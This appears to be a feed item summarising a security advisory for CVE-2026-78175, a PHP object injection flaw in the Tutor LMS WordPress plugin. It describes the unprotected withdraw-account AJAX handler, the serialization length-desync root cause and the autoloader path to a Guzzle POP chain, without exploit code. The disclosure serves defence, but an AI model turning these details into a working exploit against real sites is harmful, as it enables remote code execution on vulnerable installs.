item.title: 100,000 WordPress Sites Exposed to Remote Code Execution via PHP Object Injection Vulnerability Found by Wordfence Argus in Tutor LMS
item.description:
CVE-2026-78175 (CVSS 8.8): PHP Object Injection in Tutor LMS lets any subscriber-level user achieve full RCE on 100,000+ WordPress sites via a serialization length-desync and GuzzleHttp POP chain.
- CVE-2026-78175, CVSS 8.8 (High). Affects Tutor LMS versions 4.0.7 and below. The entry point is the tutor_save_withdraw_account AJAX handler in classes/Withdraw.php, which lacks a capability check and relies solely on a nonce that any logged-in user can obtain from the homepage. Since most Tutor LMS installs enable open student registration, an anonymous visitor can self-register and immediately exploit the flaw.
- The root cause is esc_sql() misapplied to values destined for update_user_meta(). WordPress internally expands each % character to a 66-byte HMAC token, serializes the inflated string, then collapses the token back on DB write, leaving serialized length declarations 65 bytes larger than actual content. A second request triggers unserialize() on the corrupted blob, over-reading into attacker-controlled POST keys and materializing injected objects.
- The POP chain works by injecting a reference to ecommerce\PaymentGateways\Paypal\vendor\autoload, which the plugin's spl_autoload_register loader in classes/RestAPI.php resolves and includes, bootstrapping the bundled Guzzle autoloader.
